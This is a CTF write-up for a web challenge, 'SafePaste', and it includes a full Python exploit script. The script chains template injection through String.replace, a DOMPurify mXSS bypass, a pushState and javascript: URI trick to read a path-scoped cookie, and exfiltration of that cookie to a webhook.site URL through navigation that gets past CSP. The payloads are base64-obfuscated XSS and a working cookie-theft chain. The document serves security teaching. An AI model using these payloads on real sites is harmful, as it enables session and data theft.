---
title: BITSCTF - 2026
description: A Complex Exploit Chain featuring Template Injection, DOMPurify mXSS Bypass, and Cookie Exfiltration via javascript URI Trick
date: 2026-02-21 00:00:00+0000
image: image.png
categories:
    - CTF
tags:
    - Web
    - XSS
    - mXSS
    - DOMPurify Bypass
    - Template Injection
    - CSP Bypass
    - Cookie Exfiltration
weight: 100
---

**Flag**: BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635🥀}

## Overview
- SafePaste is a pastebin-like service where users can create notes and report URLs to an admin bot for review. The goal is to steal the FLAG cookie from the bot.
- The source code has two key files:
    - `server.ts` — the Express web server
    - `bot.ts` — the Puppeteer headless browser (admin bot)

## Application Behavior

### Paste Creation & Rendering (`server.ts:36-57`)

```py
app.post("/create", (req, res) => {
  const content = req.body.content;
  const id = uuidv4();
  const clean = DOMPurify.sanitize(content);   // sanitize first
  pastes.set(id, clean);
  res.redirect(`/paste/${id}`);
});

app.get("/paste/:id", (req, res) => {
  const content = pastes.get(req.params.id);
  const html = pasteTemplate.replace("{paste}", content);  // then inject into template
  res.type("html").send(html);
});
```

=> The sanitization happens before template rendering. This ordering is the root cause of the entire exploit chain.

### The Template (`views/paste.html`)

```py
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SafePaste - View Paste</title>
</head>
<body>
  <nav><a href="/">🔒 SafePaste</a></nav>
  <div class="paste-container">
    <img src="/logo.png" alt="SafePaste">
    <div class="content">{paste}</div>   <!-- our content goes here -->
  </div>
</body>
</html>
```

### The Admin Bot (`bot.ts:21-26`)

```py
await page.setCookie({
  name: "FLAG",
  value: FLAG,
  domain: APP_HOST,
  path: "/hidden",   // cookie is ONLY sent on /hidden path
});
await page.goto(url, { waitUntil: "networkidle2", timeout: 5000 });
```

### The `/hidden` Endpoint (`server.ts:79-84`)

```py
app.get("/hidden", (req, res) => {
  if (req.query.secret === ADMIN_SECRET) {
    return res.send("Welcome, admin!");
  }
  res.socket?.destroy();  // kill connection if no valid secret
});
```

### Content Security Policy (`server.ts:24-30`)

```code
script-src 'unsafe-inline' 'unsafe-eval';
style-src 'self' 'unsafe-inline';
default-src 'self'
```

=> Inline scripts and `eval()` are allowed, but `fetch/XHR/sendBeacon` to external domains are blocked by `default-src 'self'`.

## Stage 1: Template Injection via `String.prototype.replace()`

### The Bug

- JavaScript's `String.prototype.replace(search, replacement)` supports special substitution patterns inside the replacement string:

| Pattern | Expands to |
|---------|-----------|
| `$$` | Literal `$` |
| `$&` | The matched substring |
| `` $` `` | Everything **before** the match |
| `$'` | Everything **after** the match |

=> So if our content contains **$`**, it gets replaced with the entire chunk of HTML above `{paste}` — roughly 200+ characters of raw **template markup injected** inline.

## Stage 2: DOMPurify Bypass via Attribute Breakout (mXSS)

- DOMPurify sanitizes HTML by parsing it with the DOM. When it sees an attribute value like `title="..."`, it treats the content as **plain text** — it **never** parses the inner string as HTML. So any HTML-looking content inside an attribute is completely **invisible** to DOMPurify's sanitizer.

- PAYLOAD => 
```code
<p title="$`<img src=x onerror=PAYLOAD>">x</p>
```

=> The `<img>` element is now a free-standing executable HTML element — `onerror` fires because `src=x` fails to load. XSS achieved, DOMPurify completely bypassed.

### The Full XSS Payload

```js
js_payload = f"""
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
setTimeout(async () => {{
    let w = window.open('/');
    await sleep(500);
    w.history.pushState(1, 1, "/hidden/");
    await sleep(500);
    w.location = 'javascript:"blablabla"';
    await sleep(500);
    location = '{WEBHOOK}?cookie=' + encodeURIComponent(w.document.cookie);
}}, 500);
"""

b64_payload = base64.b64encode(js_payload.encode()).decode()
handler     = f"eval(atob('{b64_payload}'))"
xss_payload = f'<p title="$`<img src=x onerror={handler}>">x</p>'
```

## Stage 3: Cookie Exfiltration via pushState + javascript: URI Trick

- The FLAG cookie has path: "`/hidden`". Browser cookie rules say: a cookie is **only sent** (and visible via document.cookie) when the **page URL** matches **the cookie's path**

### We cannot simply navigate to `/hidden` either
- Because the server has: 

```js
app.get("/hidden", (req, res) => {
  res.socket?.destroy();  // kills connection without ADMIN_SECRET
});
```

### `history.pushState({}, '', '/hidden')` alone does not work
- While it changes the URL bar, Chrome's cookie engine is still tied to the actual network path of the loaded document. `document.cookie` will still return nothing for the `/hidden` cookie.

### The Three-Step Trick

=> The solution forces Chrome to rebuild its security context from scratch based on the **spoofed URL**, without ever making a real network request to `/hidden`.

```js
// Step 1: Open a new window at a valid path
let w = window.open('/');
await sleep(500);

// Step 2: Change the URL bar to /hidden/ via pushState (no network request)
w.history.pushState(1, 1, '/hidden/');
await sleep(500);

// Step 3: Navigate to a javascript: URI that returns a string
w.location = 'javascript:"blablabla"';
await sleep(500);

// Now read the cookie
console.log(w.document.cookie);  // FLAG=BITSCTF{...} ✓
```

- The new document inherits the current URL of the window, which we set to `/hidden/` via pushState
- Chrome rebuilds the security context from scratch based on that URL
- Cookie matching is re-evaluated against `/hidden/` — and the FLAG cookie now matches
- `w.document.cookie` returns the **FLAG**
 
## CSP Bypass for Exfiltration

- The CSP `default-src 'self'` blocks:
    - `fetch('https://webhook.site/...')` — blocked
    - `XMLHttpRequest` to external domain — blocked
    - `navigator.sendBeacon(...)` — blocked

=> But **top-level navigation** is never blocked by CSP:

```js
// This is NOT an XHR/fetch — it's a plain browser navigation
location = 'https://webhook.site/?cookie=' + encodeURIComponent(w.document.cookie);
```

When location is reassigned, the browser performs a standard GET request to the webhook URL, carrying the flag as a query parameter. CSP does not apply to navigation. The webhook receives:

```code
GET /?cookie=FLAG=BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?...} HTTP/1.1
```

## Full Exploit Script

```py
#!/usr/bin/env python3
import requests, time, base64

WEBHOOK = "https://webhook.site/YOUR-ID-HERE"
TARGET  = "http://20.193.149.152:3000"

js_payload = f"""
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
setTimeout(async () => {{
    let w = window.open('/');
    await sleep(500);
    w.history.pushState(1, 1, "/hidden/");
    await sleep(500);
    w.location = 'javascript:"blablabla"';
    await sleep(500);
    location = '{WEBHOOK}?cookie=' + encodeURIComponent(w.document.cookie);
}}, 500);
"""

# Pad to eliminate '=' in Base64 output (would break unquoted attribute)
while len(js_payload.encode()) % 3 != 0:
    js_payload += " "

b64_payload = base64.b64encode(js_payload.encode()).decode()
handler     = f"eval(atob('{b64_payload}'))"
xss_payload = f'<p title="$`<img src=x onerror={handler}>">x</p>'

print(f"[*] Payload length: {len(xss_payload)}")
r = requests.post(f"{TARGET}/create", data={"content": xss_payload}, allow_redirects=False)

paste_url = TARGET + r.headers["Location"]
print(f"[+] Paste created: {paste_url}")

r2 = requests.post(f"{TARGET}/report", data={"url": paste_url})
print(f"[+] Report submitted: {r2.status_code} — {r2.text}")

print("[*] Waiting 20s for bot...")
time.sleep(20)
print("[+] Check your webhook for the flag!")
```

## Full Exploit Chain Summary

```code
Attacker crafts payload:
  <p title="$`<img src=x onerror=eval(atob('...'))>">x</p>
         │
         ▼
POST /create  →  DOMPurify sees harmless <p title="...">  →  passes ✓
         │
         ▼
GET /paste/<id>  →  pasteTemplate.replace("{paste}", content)
                 →  $` expands into 200+ chars of HTML
                 →  a " inside the expanded HTML closes title early
                 →  <img onerror=...> falls out of the attribute
                 →  browser executes the onerror handler
         │
         ▼
XSS executes eval(atob('...'))  →  runs the cookie theft JS
         │
         ▼
window.open('/')
pushState → '/hidden/'
location = 'javascript:"blablabla"'   →  Chrome rebuilds security context
                                       →  document.cookie now has FLAG
         │
         ▼
location = 'https://webhook.site/?cookie=' + FLAG
         →  plain GET navigation, CSP does not apply
         →  FLAG delivered to attacker's webhook ✓
```